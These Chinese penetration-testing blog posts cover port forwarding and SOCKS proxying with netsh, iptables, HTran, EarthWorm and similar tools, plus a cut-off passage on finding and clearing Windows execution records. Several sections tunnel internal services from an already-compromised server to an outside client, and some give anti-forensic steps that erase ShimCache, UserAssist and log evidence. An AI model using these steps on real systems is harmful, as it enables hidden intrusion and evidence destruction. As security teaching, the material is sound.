</code></pre></div></div>

<p><strong>注：</strong></p>

<p>https://nmap.org/book/可获得更多Nmap使用介绍</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了Windows平台下命令行使用Masscan和Nmap的方法，同时站在防御的角度提醒大家，内网安全同样重要，要谨慎对待。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July  5, 2017
  </div>

  
</article><article class="post">
  <h1>渗透基础——端口转发与代理</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，经常会使用到端口转发和代理。</p>

<p>端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为。</p>

<p>实际应用中需要考虑两种情况：</p>

<ul>
  <li>Client-&gt;Transit server-&gt;Server：Client能够正向连接Transit server。Transit server直接转发即可</li>
  <li>Client&lt;-Transit server-&gt;Server：Client无法正向连接Transit server，但Transit server能够反向连接Client。</li>
</ul>

<p>如果Client要对Server的多个端口进行扫描(或是多个Server的多个端口)，逐个配置转发规则很不现实。</p>

<p>为了提高效率，这里可以使用代理，配置一次规则即可。</p>

<p>本文将对常用方法和工具进行整理总结，分门别类，区分正向和反向连接，区分转发和代理，分析其中的联系和区别，并给出应用场景，以作参考。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>针对Windows系统和Linux系统(Ubuntu和CentOS)下的方法</li>
  <li>端口转发——正向连接的方法</li>
  <li>端口转发——反向连接的方法</li>
  <li>正向代理的方法</li>
  <li>反向代理的方法</li>
  <li>以上方法的应用场景</li>
</ul>

<p><strong>注：</strong></p>

<p>Go语言支持跨平台编译，所以本文更侧重于介绍Go语言实现的工具</p>

<h2 id="0x02-端口转发正向连接">0x02 端口转发——正向连接</h2>
<hr>

<h3 id="0应用场景">0、应用场景</h3>

<h4 id="1流量转发的跳板">1.流量转发的跳板</h4>

<p>用于隐藏真实的服务器地址</p>

<p>CIA Hive Beacon Infrastructure中端口转发使用的是Linux的iptables</p>

<p>如下图中的(2)</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/0.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>中转服务器的搭建可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive-Beacon-Infrastructure%E5%A4%8D%E7%8E%B01-%E4%BD%BF%E7%94%A8Apache-mod_rewrite%E5%AE%9E%E7%8E%B0http%E6%B5%81%E9%87%8F%E5%88%86%E5%8F%91/">《CIA Hive Beacon Infrastructure复现1——使用Apache mod_rewrite实现http流量分发》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive-Beacon-Infrastructure%E5%A4%8D%E7%8E%B02-%E4%BD%BF%E7%94%A8Apache-mod_rewrite%E5%AE%9E%E7%8E%B0https%E6%B5%81%E9%87%8F%E5%88%86%E5%8F%91/">《CIA Hive Beacon Infrastructure复现2——使用Apache mod_rewrite实现https流量分发》</a></p>

<h4 id="2建立通道">2.建立通道</h4>

<p>连接内网服务器的指定端口</p>

<p>Client能够正向连接到Transit server</p>

<h3 id="1测试环境">1、测试环境</h3>

<p>Client: 192.168.111.136</p>

<p>Server: 192.168.111.103</p>

<p>网络连接如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/2-1.png" alt="Alt text"></p>

<p>使用nc测试网络连接</p>

<p>Server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvp 4444
</code></pre></div></div>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -vv 192.168.111.103 4444
</code></pre></div></div>

<p>Client连接成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/2-2.png" alt="Alt text"></p>

<h3 id="2windows系统下的端口转发方法">2、Windows系统下的端口转发方法</h3>

<p>Transit server: 192.168.111.132</p>

<p>网络连接如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/2-3.png" alt="Alt text"></p>

<h4 id="1使用netsh实现端口转发需要管理员权限">1、使用netsh实现端口转发(需要管理员权限)</h4>

<p>(1)添加转发规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh interface portproxy add v4tov4 listenaddress=192.168.111.132 listenport=7777 connectaddress=192.168.111.103  connectport=4444
</code></pre></div></div>

<p>(2)添加防火墙入站规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall add rule name="transit test" protocol=TCP dir=in localport=7777 action=allow
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>默认配置允许出站并阻挡入站通信，所以此处仅需要添加入站规则</p>

<p>测试网络连接：</p>

<p>Server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvp 4444
</code></pre></div></div>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -vv 192.168.111.132 7777
</code></pre></div></div>

<p>Client连接成功</p>

<p>(3)查看端口转发规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh interface portproxy show all
</code></pre></div></div>

<p>(4)清除端口转发规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh interface portproxy delete v4tov4 listenaddress=192.168.111.132 listenport=7777
</code></pre></div></div>

<p>(5)清除防火墙规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall delete rule name="transit test"
</code></pre></div></div>

<h4 id="2使用rinetd实现端口转发">2、使用rinetd实现端口转发</h4>

<p>下载地址：</p>

<p>https://boutell.com/rinetd/http/rinetd.zip</p>

<p>仅需要压缩包中的rinetd.exe</p>

<p>(1)为rinetd.exe添加防火墙规则(管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall add rule name="transit test2" dir=in program="c:\test\rinetd.exe" action=allow
</code></pre></div></div>

<p>(2)编写转发规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 0.0.0.0 7777 192.168.111.103 4444 &gt; conf.txt
</code></pre></div></div>

<p>(3)启动</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rinetd.exe -c c:\test\conf.txt
</code></pre></div></div>

<p>(4)清除防火墙规则(管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall delete rule name="transit test2" dir=in program="c:\test\rinetd.exe"
</code></pre></div></div>

<h4 id="3使用htran实现端口转发">3、使用HTran实现端口转发</h4>

<p><strong>注：</strong></p>

<p>lcx同其功能类似</p>

<p>源码来源于互联网，我在github做了备份，备份地址：</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/HTran.cpp</p>

<p>(1)为HTran.exe添加防火墙规则(管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall add rule name="transit test3" dir=in program="c:\test\HTran.exe" action=allow
</code></pre></div></div>

<p>(2)开启转发功能</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTran.exe -tran 7777 192.168.111.103 4444
</code></pre></div></div>

<p>(3)清除防火墙规则(管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall delete rule name="transit test3" dir=in program="c:\test\HTran.exe"
</code></pre></div></div>

<h4 id="4使用earthworm实现端口转发">4、使用EarthWorm实现端口转发</h4>

<p>下载地址：</p>

<p>https://github.com/rootkiter/EarthWorm</p>

<p>(1)为ew_for_win_32.exe添加防火墙规则(管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall add rule name="transit test4" dir=in program="c:\test\ew_for_win_32.exe" action=allow
</code></pre></div></div>

<p>(2)开启转发功能</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ew_for_win_32.exe -s lcx_tran -l 7777 -f 192.168.111.103 -g 4444
</code></pre></div></div>

<p>(3)清除防火墙规则(管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall delete rule name="transit test4" dir=in program="c:\test\ew_for_win_32.exe"
</code></pre></div></div>

<h3 id="3linux系统ubuntu下的常用端口转发方法">3、Linux系统(Ubuntu)下的常用端口转发方法</h3>

<p>Transit server: 192.168.111.102</p>

<p>网络连接如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/2-4.png" alt="Alt text"></p>

<h4 id="1使用iptables实现端口转发">1、使用iptables实现端口转发</h4>

<p>(1)开启转发功能</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>该命令立即生效，重启失效</p>

<p>(2)添加转发规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables -t nat -A PREROUTING -p tcp -d 192.168.111.102 --dport 8888 -j DNAT --to-destination 192.168.111.103:4444
iptables -t nat -A POSTROUTING -p tcp -d 192.168.111.103 --dport 4444 -j SNAT --to-source 192.168.111.102
</code></pre></div></div>

<p>(3)查看转发规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables -L -t nat --line-number
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/2-5.png" alt="Alt text"></p>

<p>测试网络连接：</p>

<p>Server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvp 4444
</code></pre></div></div>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -vv 192.168.111.102 8888
</code></pre></div></div>

<p>Client连接成功</p>

<p>(4)清除规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables -F -t nat
</code></pre></div></div>

<p>(5)保存规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables-save &gt; /etc/iptables.up.rules
</code></pre></div></div>

<p>(6)恢复规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables-restore &lt; /etc/iptables.up.rules
</code></pre></div></div>

<h4 id="2使用rinetd实现端口转发-1">2、使用rinetd实现端口转发</h4>

<p>(1)编译安装</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://www.boutell.com/rinetd/http/rinetd.tar.gz
tar zxvf rinetd.tar.gz
cd rinetd
make
</code></pre></div></div>

<p>(2)编写转发规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 0.0.0.0 8888 192.168.111.103 4444 &gt; /etc/rinetd.conf
</code></pre></div></div>

<p>(3)启动</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./rinetd.exe
</code></pre></div></div>

<p>(4)结束进程</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pkill -9 rinetd
</code></pre></div></div>

<h4 id="3使用htran实现端口转发-1">3、使用HTran实现端口转发</h4>

<p>Linux版HTran(lcx)的源码参考如下地址：</p>

<p>https://github.com/windworst/LCX</p>

<p>需要使用gcc重新编译</p>

<p>(1)开启转发功能</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./lcx -tran 8888 192.168.111.103 4444
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>go语言编写的HTran(lcx)，优点是跨平台，支持Windows和Linux</p>

<p>下载地址：</p>

<p>https://github.com/cw1997/NATBypass</p>

<h4 id="4使用earthworm实现端口转发-1">4、使用EarthWorm实现端口转发</h4>

<p>下载地址：</p>

<p>https://github.com/rootkiter/EarthWorm</p>

<p>未开源</p>

<p>(1)开启转发功能</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./ew_for_linux -s lcx_tran -l 8888 -f 192.168.111.103 -g 4444
</code></pre></div></div>

<h3 id="4linux系统centos下的常用端口转发方法">4、Linux系统(CentOS)下的常用端口转发方法</h3>

<p>Transit server: 192.168.111.105</p>

<p>网络连接如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/2-6.png" alt="Alt text"></p>

<h4 id="1使用iptables实现端口转发-1">1、使用iptables实现端口转发</h4>

<p>(1)开启转发功能</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>该命令立即生效，系统重启失效</p>

<p>(2)安装iptables</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemctl stop firewalld  
systemctl mask firewalld  
yum install iptables-services
systemctl enable iptables
</code></pre></div></div>

<p>(3)添加转发规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables -t nat -A PREROUTING -p tcp -d 192.168.111.105 --dport 8888 -j DNAT --to-destination 192.168.111.103:4444
iptables -t nat -A POSTROUTING -p tcp -d 192.168.111.103 --dport 4444 -j SNAT --to-source 192.168.111.105
service iptables save
service iptables restart
service iptables status
</code></pre></div></div>

<p>(4)查看转发规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables -L -t nat --line-number
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/2-7.png" alt="Alt text"></p>

<p>测试网络连接：</p>

<p>Server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvp 4444
</code></pre></div></div>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -vv 192.168.111.105 8888
</code></pre></div></div>

<p>Client连接成功</p>

<p>(4)清除规则</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables -F -t nat
</code></pre></div></div>

<h4 id="2使用rinetd实现端口转发-2">2、使用rinetd实现端口转发</h4>

<p>同Ubuntu，此处省略</p>

<h4 id="3使用htran实现端口转发-2">3、使用HTran实现端口转发</h4>

<p>同Ubuntu，此处省略</p>

<h4 id="4使用earthworm实现端口转发-2">4、使用EarthWorm实现端口转发</h4>

<p>同Ubuntu，此处省略</p>

<h2 id="0x03-端口转发反向连接">0x03 端口转发——反向连接</h2>
<hr>

<h3 id="0应用场景-1">0、应用场景</h3>

<h4 id="1建立通道">1.建立通道</h4>

<p>连接内网服务器的指定端口</p>

<p>测试环境如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/3-1.png" alt="Alt text"></p>

<p>已有Transit server权限，想要访问Server的3389端口</p>

<p>Client无法正向连接到Transit server，但Transit server能够反向连接到Client</p>

<p>iptables和rinetd不再适用</p>

<h4 id="1使用htran">1、使用HTran</h4>

<p>支持Windows和Linux</p>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTran -listen 1111 2222
</code></pre></div></div>

<p>Transit server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTran -slave 1.1.1.1 1111 10.0.0.2 3389
</code></pre></div></div>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -vv 127.0.0.1 2222
</code></pre></div></div>

<h4 id="2使用earthworm">2、使用EarthWorm</h4>

<p>支持Windows和Linux</p>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ew -s lcx_listen -l 2222 -e 1111
</code></pre></div></div>

<p>Transit server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ew -s lcx_slave -d 1.1.1.1 -e 1111 -f 10.0.0.2 -g 3389
</code></pre></div></div>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -vv 127.0.0.1 2222
</code></pre></div></div>

<h2 id="0x04-正向代理">0x04 正向代理</h2>
<hr>

<h3 id="0应用场景-2">0、应用场景</h3>

<h4 id="1内网扫描">1.内网扫描</h4>

<p>对内网的多个端口进行扫描</p>

<p>Client能够正向连接到Transit server</p>

<p>测试环境如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/3-2.png" alt="Alt text"></p>

<p>要对Server1、Server2和Server3的端口进行扫描</p>

<p>Socks4代理只支持TCP协议，而Socks5代理支持TCP协议和UDP协议，更加全面，所以本文只介绍实现Socks5代理的方法</p>

<h4 id="1使用htran-1">1、使用HTran</h4>

<p>网上流传HTran2.4支持Socks5代理，但我未找到开源代码，此处作一个标记</p>

<h4 id="2使用earthworm-1">2、使用EarthWorm</h4>

<p>Transit server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ew –s ssocksd –l 8888
</code></pre></div></div>

<p>Client使用代理工具连接Transit server的8888端口</p>

<h4 id="3使用goproxy">3、使用goproxy</h4>

<p>go实现的高性能http,https,websocket,tcp,udp,socks5,ss代理服务器,支持正向代理、反向代理、透明代理、内网穿透、TCP/UDP端口映射、SSH中转</p>

<p>下载地址：</p>

<p>https://github.com/snail007/goproxy/</p>

<p>Transit server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxy socks -t tcp -p "0.0.0.0:8888"
</code></pre></div></div>

<p>Client使用代理工具连接Transit server的8888端口</p>

<h3 id="4自己使用go实现">4、自己使用go实现</h3>

<p>Windows系统安装Go：</p>

<p>https://golang.org/dl/</p>

<p>安装git：</p>

<p>http://git-scm.com/downloads</p>

<p>安装go-socks5：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go get github.com/armon/go-socks5
go build
</code></pre></div></div>

<p>test.go:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package main
import socks5 "github.com/armon/go-socks5"
func main() {
        conf := &amp;socks5.Config{}
        server, err := socks5.New(conf)
        if err != nil {
          panic(err)
        }
        if err := server.ListenAndServe("tcp", "0.0.0.0:8888"); err != nil {
          panic(err)
        }
}
</code></pre></div></div>

<p>编译</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go build test.go
</code></pre></div></div>

<p>Client使用代理工具连接Transit server的8888端口</p>

<h4 id="5使用regeorg">5、使用reGeorg</h4>

<p>下载地址：</p>

<p>https://github.com/NoneNotNull/reGeorg</p>

<table>
  <tbody>
    <tr>
      <td>针对web服务器，支持(aspx</td>
      <td>ashx</td>
      <td>jsp</td>
      <td>php)</td>
    </tr>
  </tbody>
</table>

<p><strong>注：</strong></p>

<p>Windows下连接socks代理的工具可使用sockscap64</p>

<p>Linux下连接socks代理的工具可使用proxychains</p>

<h2 id="0x05-反向代理">0x05 反向代理</h2>
<hr>

<h3 id="0应用场景-3">0、应用场景</h3>

<h4 id="1内网扫描-1">1.内网扫描</h4>

<p>对内网的多个端口进行扫描</p>

<p>测试环境如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/3-3.png" alt="Alt text"></p>

<p>Client无法正向连接到Transit server，但Transit server能够反向连接到Client</p>

<p>要对Server1、Server2和Server3的端口进行扫描</p>

<h4 id="1使用earthworm">1、使用EarthWorm</h4>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ew -s rcsocks -l 2222 -e 1111
</code></pre></div></div>

<p>Transit server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ew -s rssocks -d 1.1.1.1 -e 1111
</code></pre></div></div>

<p>使用代理工具连接Client的2222端口</p>

<h4 id="2使用rsocks">2、使用rsocks</h4>

<p>下载地址：</p>

<p>https://github.com/brimstone/rsocks</p>

<p>Go语言编写，支持Windows和Linux</p>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rsocks -listen :1111 -socks 127.0.0.1:2222
</code></pre></div></div>

<p>Transit server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rsocks -connect 1.1.1.1:1111
</code></pre></div></div>

<p>使用代理工具连接Client的2222端口</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对端口转发和代理的常用工具和方法进行整理总结，划分正向和反向连接两个类别，分别介绍了应用场景和常用工具，可作为实际应用的参考。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October  7, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows系统文件执行记录的获取与清除</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>站在渗透的角度，当获得了一台Windows主机的权限后，需要全面了解这台Windows主机的信息，文件执行记录是重要的部分。</p>

<p>而站在防御的角度，文件执行记录包含系统的重要信息，对其进行针对性的清除很有必要。</p>

<p>所以本文将尝试对Windows主机(Win7及以上系统)常见文件执行记录的位置进行整理，尝试获取并清除单条记录，分析利用思路，总结防御方法。</p>

<p>参考链接：</p>

<p>https://blog.1234n6.com/2018/10/available-artifacts-evidence-of.html?m=1
https://xz.aliyun.com/t/3067#toc-5</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>从日志获得文件执行记录</li>
  <li>从注册表获得文件执行记录</li>
  <li>从文件获得文件执行记录</li>
  <li>实例测试</li>
  <li>利用和防御思路</li>
</ul>

<h2 id="0x02-从日志获得文件执行记录">0x02 从日志获得文件执行记录</h2>
<hr>

<h3 id="1进程创建id4688">1、进程创建(ID:4688)</h3>

<p>使用条件：</p>

<p>系统默认关闭该功能，需要手动设置开启</p>

<p>Policy location: <code class="language-plaintext highlighter-rouge">Computer Configuration</code> -&gt; <code class="language-plaintext highlighter-rouge">Policies</code> -&gt; <code class="language-plaintext highlighter-rouge">Windows Settings</code> -&gt; <code class="language-plaintext highlighter-rouge">Security Settings</code> -&gt; <code class="language-plaintext highlighter-rouge">Advanced Audit Configuration</code> -&gt; <code class="language-plaintext highlighter-rouge">Detailed Tracking</code></p>

<p>Policy Name: <code class="language-plaintext highlighter-rouge">Audit Process Creation</code></p>

<p>命令行获得日志信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil qe security /rd:true /f:text /q:"Event[System[(EventID=4688)]]"
</code></pre></div></div>

<h4 id="清除记录的方法">清除记录的方法：</h4>

<p>单条日志的清除，可参考之前的文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4/">《渗透技巧——Windows单条日志的删除》</a></p>

<h3 id="2microsoft-windows-application-experience-program-inventory">2、Microsoft-Windows-Application-Experience Program-Inventory</h3>

<p>参考资料：</p>

<p>http://journeyintoir.blogspot.com/2014/03/exploring-program-inventory-event-log.html</p>

<ul>
  <li>800 (summary of software activities)</li>
  <li>903 &amp; 904 (new application installation)</li>
  <li>905 &amp; 906 (updated application)</li>
  <li>907 &amp; 908 (removed application).</li>
</ul>

<p>命令行获得日志信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil qe Microsoft-Windows-Application-Experience/Program-Inventory
</code></pre></div></div>

<h3 id="3microsoft-windows-application-experience-program-telemetry">3、Microsoft-Windows-Application-Experience Program-Telemetry</h3>

<p>命令行获得日志信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil qe Microsoft-Windows-Application-Experience/Program-Telemetry
</code></pre></div></div>

<h2 id="0x03-从注册表获得文件执行记录">0x03 从注册表获得文件执行记录</h2>
<hr>

<h3 id="1shimcache">1、ShimCache</h3>

<p>参考资料：</p>

<p>https://www.fireeye.com/blog/threat-research/2015/06/caching_out_the_val.html</p>

<p>用来记录Windows系统程序执行时产生的兼容性问题</p>

<p>位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
</code></pre></div></div>

<p>XP最多保存96条记录，Win7及以上最多保存1024条记录</p>

<p>记录以下内容：</p>

<ul>
  <li>文件路径</li>
  <li>上次修改时间</li>
  <li>是否被执行</li>
</ul>

<p><strong>注：</strong></p>

<p>ShimCache不仅会记录exe文件的执行，而且会对exe文件同级目录下的文件进行记录(如果文件没有执行，那么Executed的属性为no)</p>

<p>数据以固定格式保存，存储结构可参考：</p>

<p>https://www.fireeye.com/content/dam/fireeye-www/services/freeware/shimcache-whitepaper.pdf</p>

<h4 id="解析工具">解析工具</h4>

<p>(1)</p>

<p>源代码开源(c#)</p>

<p>https://github.com/EricZimmerman/AppCompatCacheParser/</p>

<p>用法示例：</p>

<p>读取当前系统的注册表并将结果输出的到指定路径：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AppCompatCacheParser.exe --csv c:\test
</code></pre></div></div>

<p>输出结果按照上次修改的时间排序:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AppCompatCacheParser.exe --csv c:\test -t
</code></pre></div></div>

<p>读取指定System文件并将结果输出的到指定路径：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AppCompatCacheParser.exe --csv c:\test -h C:\Windows\System32\config\SYSTEM
</code></pre></div></div>

<p>(2)</p>

<p>源代码开源(python)</p>

<p>如果想要先导出注册表文件，然后在另一系统中获得解析结果，可使用python实现的脚本：</p>

<p>https://github.com/mandiant/ShimCacheParser</p>

<p>用法示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" ShimCache.reg
ShimCacheParser.py -o out.csv -r c:\test\ShimCache.reg -t
</code></pre></div></div>

<p>通过System文件导出结果：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ShimCacheParser.py -o out.csv -i C:\Windows\System32\config\SYSTEM -t
</code></pre></div></div>

<h4 id="清除记录的方法-1">清除记录的方法</h4>

<p>ShimCache只会在系统重新启动后更新(注销当前用户不会更新)</p>

<p>也就是说，想要清除本次系统从启动至关机的ShimCache记录，有两种方法：</p>

<p>(1)修改注册表</p>

<p>备份当前注册表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" ShimCache.reg
</code></pre></div></div>

<p>系统重启后，恢复注册表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg import ShimCache.reg
</code></pre></div></div>

<p>(2)非正常关机</p>

<p>跳过写入注册表的操作，无法记录本次系统自启动至关机的记录</p>

<p>(3)修改内存</p>

<p>(理论上可行)</p>

<h3 id="2userassist">2、UserAssist</h3>

<p>参考资料：</p>

<p>https://www.4n6k.com/2013/05/userassist-forensics-timelines.html</p>

<p>可以用来记录Windows系统程序执行的次数和最后一次执行时间</p>

<p>位置：</p>

<p>当前用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
</code></pre></div></div>

<p>所有用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_USERS\&lt;sid&gt;\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
</code></pre></div></div>

<p>子健的名称使用ROT-13加密(解密比较简单)</p>

<p>记录实时更新</p>

<h4 id="解析工具-1">解析工具</h4>

<p>(1)</p>

<p>命令行解析</p>

<p>https://www.nirsoft.net/utils/userassist_view.html</p>

<p>用法示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UserAssistView.exe  /stext out.txt
</code></pre></div></div>

<p>(2)</p>

<p>源代码开源(c#)</p>

<p>https://blog.didierstevens.com/programs/userassist/</p>

<h4 id="清除记录的方法-2">清除记录的方法</h4>

<p>清除对应的注册表键值</p>

<h3 id="3muicache">3、MUICache</h3>

<p>参考资料：</p>

<p>http://what-when-how.com/windows-forensic-analysis/registry-analysis-windows-forensic-analysis-part-8/</p>

<p>用来记录exe文件的文件名称，在注册表中保存exe文件的绝对路径和对应exe文件的文件名称</p>

<p>位置：</p>

<p>当前用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache
</code></pre></div></div>

<p>所有用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_USERS\&lt;sid&gt;\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache
